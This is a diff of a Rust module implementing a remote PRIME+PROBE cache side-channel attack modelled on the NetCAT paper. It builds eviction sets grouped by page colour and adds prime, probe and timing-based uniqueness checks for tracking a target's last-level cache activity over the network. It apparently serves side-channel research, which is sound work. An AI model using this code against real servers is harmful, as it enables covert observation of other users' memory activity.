@@ -1,22 +1,20 @@
 //! # Remote PRIME+PROBE
 //! This module is responsible for implementing PRIME+PROBE method of cache activity tracking.
 //! The method is described in _NetCAT: Practical Cache Attacks from the Network_.
-
 #![allow(dead_code)]
+
+mod params;
+mod rpp_connector;
+
 use crate::connection::{MemoryConnector, Time};
 use hdrhistogram::Histogram;
+pub use params::*;
 use rand;
+use rpp_connector::RppConnector;
 use std::cmp::min;
 use std::collections::{BTreeSet, HashMap, HashSet};
 use std::io::Result;
 use std::io::{Error, ErrorKind};
-
-pub const PAGE_SIZE: usize = 4096; // 4 KiB
-pub const ADDR_NUM: usize = 5000; // We take this number from the netcat article
-
-pub const BYTES_PER_LINE: usize = 64;
-pub const LINES_PER_SET: usize = 12;
-pub const CACHE_SIZE: usize = 6_291_456; // 6 MiB
 
 pub const DELTA: usize = 30;
 pub const TIMINGS_INIT_FILL: usize = 1000;
@@ -24,8 +22,8 @@ pub const TIMING_REFRESH_RATE: usize = 1000;
 pub const INSERT_RATE: usize = 100;
 pub const PERCENTILE: f64 = 50.0;
 
-type Address = usize;
-type Contents = u8;
+pub type Address = usize;
+pub type Contents = u8;
 
 #[macro_export]
 macro_rules! median {
@@ -43,58 +41,31 @@ macro_rules! median {
 
 /// # EvictionSet
 /// EvictionSet
-type EvictionSet = HashSet<Address>;
-type EvictionSets = HashMap<BTreeSet<usize>, Vec<EvictionSet>>;
+pub type EvictionSet = HashSet<Address>;
 
-/// # Params
-/// Parameters for Remote PRIME+PROBE.
-#[derive(Clone, Copy)]
-pub struct CacheParams {
-    bytes_per_line: usize,
-    lines_per_set: usize,
-    cache_size: usize,
-}
+/// A custom code, representing one page color
+pub type ColorCode = usize;
 
-impl CacheParams {
-    pub fn new(bytes_per_line: usize, lines_per_set: usize, cache_size: usize) -> CacheParams {
-        CacheParams {
-            bytes_per_line,
-            lines_per_set,
-            cache_size,
-        }
-    }
-}
+/// A custom code, representing one page color
+pub type ColoredSetCode = usize;
 
-impl Default for CacheParams {
-    fn default() -> Self {
-        Self::new(BYTES_PER_LINE, LINES_PER_SET, CACHE_SIZE)
-    }
-}
+#[derive(Copy, Clone, Default, Debug, PartialOrd, PartialEq)]
+pub struct SetCode(pub ColorCode, pub ColoredSetCode);
 
-#[derive(Clone, Default)]
-struct RppParams {
-    n_lines: usize,
-    n_sets: usize,
-    v_buf: usize,
-}
-
-impl From<CacheParams> for RppParams {
-    fn from(cp: CacheParams) -> Self {
-        let mut p: RppParams = Default::default();
-        p.n_lines = cp.lines_per_set;
-        p.n_sets = cp.cache_size / (cp.lines_per_set * cp.bytes_per_line);
-        p.v_buf = ADDR_NUM * PAGE_SIZE;
-
-        p
-    }
-}
+type SetsKey = BTreeSet<Address>;
+type EvictionSets = Vec<EvictionSet>;
+// a mapping from the color code to the eviction sets, corresponding to this color
+type ColoredSets = Vec<EvictionSets>;
+// a mapping from the color code to the page numbers (aka addr/4096) of this color
+type ColorKeys = Vec<SetsKey>;
 
 /// # RPP
 /// Contains the context of the RPP for a given connection.
 pub struct Rpp {
     params: RppParams,
-    conn: Box<dyn MemoryConnector<Item = Contents>>,
-    sets: EvictionSets,
+    conn: RppConnector<Contents>,
+    colored_sets: ColoredSets, // maps a color code
+    color_keys: ColorKeys,
     addrs: HashSet<Address>,
     timings: Histogram<u64>, // we will be using this to dynamically scale threshold
 }
@@ -113,15 +84,47 @@ impl Rpp {
         let params: RppParams = cparams.into();
 
         let mut rpp = Rpp {
-            sets: EvictionSets::with_capacity(params.n_sets),
+            colored_sets: ColoredSets::with_capacity(params.n_colors),
+            color_keys: ColorKeys::with_capacity(params.n_colors),
             params,
-            conn,
+            conn: conn.into(),
+            // TODO: do we really need ADDR_NUM here? We need at least as much page as there are colors. Maybe manipulate `params.n_colors`?
             addrs: (0usize..ADDR_NUM).map(|x| x * PAGE_SIZE).collect(), // here we collect page aligned (e.i. at the begining of the page) adresses
             timings: hist,
         };
         rpp.build_sets();
 
         rpp
+    }
+
+    /// Primes the given set of addresses
+    pub fn prime(&mut self, set_code: &SetCode) -> Result<()> {
+        let it = self.colored_sets[set_code.0][set_code.1].clone();
+        self.conn.evict(it.into_iter())
+    }
+
+    /// Probes the given set of addresses. Returns true if a set activation detected
+    pub fn probe(&mut self, set_code: &SetCode) -> Result<Option<SetCode>> {
+        // TODO Two activations should be measured.
+        let set: Vec<usize> = self.colored_sets[set_code.0][set_code.1]
+            .iter()
+            .copied()
+            .collect();
+            
+        let lats = set
+            .into_iter()
+            .map(|x| self.conn.time(x))
+            .collect::<Result<Vec<Time>>>()?;
+
+        let max = lats.iter().max().unwrap();
+        let min = lats.iter().min().unwrap();
+
+        // NOTE This might be a unstable
+        if max - min > self.threshold() {
+            return Ok(None);
+        }
+
+        Ok(Some(*set_code))
     }
 
     fn fill_hist(&mut self) {
@@ -136,11 +139,11 @@ impl Rpp {
             .choose_multiple(&mut rng, TIMINGS_INIT_FILL)
         {
             // here we read from the main memory
-            let (_, t1) = self.conn.read_timed(ofs).expect("Could not read in hist");
+            let t1 = self.conn.time(ofs).expect("Could not read in hist");
 
             // here we fist write the value to cache it and read again from cache
-            self.cache(ofs).expect("Could not write for hist");
-            let (_, t2) = self.conn.read_timed(ofs).expect("Could not read in hist");
+            self.conn.cache(ofs).expect("Could not write for hist");
+            let t2 = self.conn.time(ofs).expect("Could not read in hist");
 
             // we expect the latency from main memory to be bigger that from LLC
             if t1 < t2 {
@@ -156,6 +159,7 @@ impl Rpp {
         static mut CALLED: usize = 0;
 
         unsafe {
+            // unsafe, because mutating static variable
             CALLED += 1;
             if CALLED > TIMING_REFRESH_RATE {
                 self.timings.clear();
@@ -163,6 +167,10 @@ impl Rpp {
             }
         }
 
+        self.timings.value_at_percentile(PERCENTILE)
+    }
+
+    fn trsh_noup(&self) -> Time {
         self.timings.value_at_percentile(PERCENTILE)
     }
 
@@ -178,39 +186,8 @@ impl Rpp {
             .expect("Failed to record new timing");
     }
 
-    // allocates new way in cache (read for local, write for DDIO)
-    #[cfg(not(feature = "local"))]
-    fn cache(&mut self, x: usize) -> Result<()> {
-        self.conn.write(x, &rand::random())
-    }
-
-    #[cfg(feature = "local")]
-    fn cache(&mut self, x: usize) -> Result<()> {
-        self.conn.read(x)?;
-        Ok(())
-    }
-
-    // alocates cache lines for all iterator values, which might cause eviction
-    #[cfg(not(feature = "local"))]
-    fn evict<I: Iterator<Item = Address>>(&mut self, it: I) -> Result<()> {
-        for x in it {
-            self.conn.write(x, &rand::random())?;
-        }
-
-        Ok(())
-    }
-
-    #[cfg(feature = "local")]
-    fn evict<I: Iterator<Item = Address>>(&mut self, it: I) -> Result<()> {
-        for x in it {
-            self.conn.read(x)?;
-        }
-
-        Ok(())
-    }
-
-    fn profiled(&self) -> usize {
-        self.sets.values().map(|v| v.len()).sum()
+    pub fn profiled(&self) -> usize {
+        self.colored_sets.iter().map(|v| v.len()).sum()
     }
 
     fn build_sets(&mut self) {
@@ -253,12 +230,13 @@ impl Rpp {
     }
 
     fn add_set(&mut self, set: EvictionSet) -> Result<()> {
-        // TODO verify uniqueness
-        let set_key = set.iter().map(|&x| x / PAGE_SIZE).collect();
+        let mut set_pages_nums = set.iter().map(|&x| x / PAGE_SIZE).collect();
         let possible_keys: Vec<_> = self
-            .sets
-            .keys()
-            .filter(|k| !k.is_disjoint(&set_key))
+            .color_keys
+            .iter()
+            .enumerate()
+            .filter(|(_, v)| !v.is_disjoint(&set_pages_nums))
+            .map(|(k, _)| k)
             .collect();
 
         // DEBUG: Page coloring may be not enabled for a given OS
@@ -271,22 +249,67 @@ impl Rpp {
         }
 
         if possible_keys.len() == 0 {
-            self.sets.insert(set_key, vec![set]);
+            self.colored_sets.push(vec![set]);
+            self.color_keys.push(set_pages_nums);
             return Ok(());
         }
 
-        // UGLY: Do not need to update a key, if it is a superset
-        let possible_key = possible_keys[0].clone();
-        // take list of previous sets
-        let mut val = self.sets.remove(&possible_key).unwrap();
-        // add a new one
-        val.push(set);
-        // key is a union
-        let key = set_key.union(&possible_key).copied().collect();
-        // insert new entry
-        self.sets.insert(key, val);
+        let color_code = possible_keys[0];
+
+        if !self.is_unique(color_code, &set)? {
+            return Ok(());
+        }
+
+        // add our set to the corresponding key
+        self.colored_sets[color_code].push(set);
+
+        // union of the previous page nums and new page nums
+        self.color_keys[color_code].append(&mut set_pages_nums);
 
         Ok(())
+    }
+
+    fn is_unique(&mut self, color_code: ColorCode, set: &EvictionSet) -> Result<bool> {
+        const REPEATING: usize = 4; // We will try for multiple times,
+                                    // taking the most probable result
+        let mut unique = true;
+        for other_set in self.colored_sets[color_code].iter() {
+            let mut results = HashMap::with_capacity(2); // Bool -> usize
+            for _ in 0..REPEATING {
+                *results
+                    .entry(Self::test_uniq(
+                        set,
+                        other_set,
+                        self.trsh_noup(),
+                        &mut self.conn,
+                    )?)
+                    .or_insert(0) += 1;
+            }
+
+            // We consider the most probable result to be true
+            unique = unique && results.into_iter().max_by_key(|(_, v)| *v).unwrap().0;
+        }
+
+        Ok(unique)
+    }
+
+    fn test_uniq(
+        set: &EvictionSet,
+        other_set: &EvictionSet,
+        trsh: Time,
+        conn: &mut RppConnector<Contents>,
+    ) -> Result<bool> {
+        use rand::seq::IteratorRandom;
+        let test_addr = *other_set.iter().choose(&mut rand::thread_rng()).unwrap();
+        conn.cache(test_addr)?;
+        let t1 = conn.time(test_addr)?;
+        conn.evict(set.iter().copied())?;
+        let t2 = conn.time(test_addr)?;
+
+        if t2 < t1 || t2 - t1 < trsh {
+            return Ok(false);
+        }
+        Ok(true)
     }
 
     fn forward_selection(&mut self) -> Result<(EvictionSet, Address)> {
@@ -297,11 +320,11 @@ impl Rpp {
             let mut sub_set: EvictionSet = self.addrs.iter().take(n).copied().collect();
             // First, we write the whole buffer. Some addrs might get evicted by the consequent writes.
             // If this fails, then repeating won't help
-            self.evict(sub_set.iter().copied())?;
+            self.conn.evict(sub_set.iter().copied())?;
 
             // Measure access time for all entries of a selected subset
             for addr in sub_set.iter() {
-                let (_, lat) = self.conn.read_timed(*addr)?;
+                let lat = self.conn.time(*addr)?;
                 latencies.insert(*addr, lat);
             }
 
@@ -309,13 +332,13 @@ impl Rpp {
             let x = *latencies.iter().max_by_key(|(_, &v)| v).unwrap().0; // Take the key from the pair (which is an address with the biggest latency)
 
             // Measure cache hit time for x
-            self.cache(x)?;
-            let t1 = self.conn.read_timed(x)?.1;
+            self.conn.cache(x)?;
+            let t1 = self.conn.time(x)?;
 
             // Potentially take x from the main memory
             sub_set.remove(&x);
-            self.evict(sub_set.iter().copied())?;
-            let t2 = self.conn.read_timed(x)?.1;
+            self.conn.evict(sub_set.iter().copied())?;
+            let t2 = self.conn.time(x)?;
 
             // Both t1 and t2 are from cache
             if t1 > t2 {
@@ -369,12 +392,12 @@ impl Rpp {
             let s_rm: EvictionSet = s.iter().take(n).copied().collect();
 
             // Measure cache hit time for x
-            self.cache(x)?;
-            let t1 = self.conn.read_timed(x)?.1;
+            self.conn.cache(x)?;
+            let t1 = self.conn.time(x)?;
 
             // Potentially read x from the main memory
-            self.evict(s.difference(&s_rm).copied())?;
-            let t2 = self.conn.read_timed(x)?.1;
+            self.conn.evict(s.difference(&s_rm).copied())?;
+            let t2 = self.conn.time(x)?;
 
             // Both t1 and t2 are from cache
             if t1 > t2 {
@@ -413,12 +436,12 @@ impl Rpp {
         let mut last_i = 0;
         for (i, x) in addrs.into_iter().enumerate() {
             // measure x hit time
-            self.cache(x)?;
-            let t1 = self.conn.read_timed(x)?.1;
+            self.conn.cache(x)?;
+            let t1 = self.conn.time(x)?;
 
             // potentially read x from the main memory
-            self.evict(&mut s.iter().copied())?;
-            let t2 = self.conn.read_timed(x)?.1;
+            self.conn.evict(&mut s.iter().copied())?;
+            let t2 = self.conn.time(x)?;
 
             // Both t1 and t2 are from cache
             if t1 > t2 {
@@ -442,11 +465,33 @@ impl Rpp {
     // -------------------------METHODS FOR ONLINE TRACKER---------------------
 
     pub fn colors_len(&self) -> usize {
-        self.sets.len()
+        self.colored_sets.len()
     }
 
-    pub fn colors<'a>(&'a self) -> impl Iterator<Item=(&BTreeSet<usize>, &Vec<EvictionSet>)> + 'a {
-        self.sets.iter()
+    pub fn colors<'a>(&'a self) -> impl Iterator<Item = ColorCode> + 'a {
+        self.colored_sets.iter().enumerate().map(|(i, _)| i)
+    }
+
+    pub fn color_len(&self, color_code: ColorCode) -> usize {
+        self.colored_sets[color_code].len()
+    }
+
+    pub fn iter_color<'a>(
+        &'a self,
+        color_code: ColorCode,
+    ) -> impl Iterator<Item = ColoredSetCode> + 'a {
+        0..self.colored_sets[color_code].len()
+    }
+
+    pub fn iter<'a>(&'a self) -> impl Iterator<Item = SetCode> + 'a {
+        self.colored_sets
+            .iter()
+            .enumerate()
+            .flat_map(|(color_code, v)| {
+                v.iter()
+                    .enumerate()
+                    .map(move |(set_code, _)| SetCode(color_code, set_code))
+            })
     }
 }
 
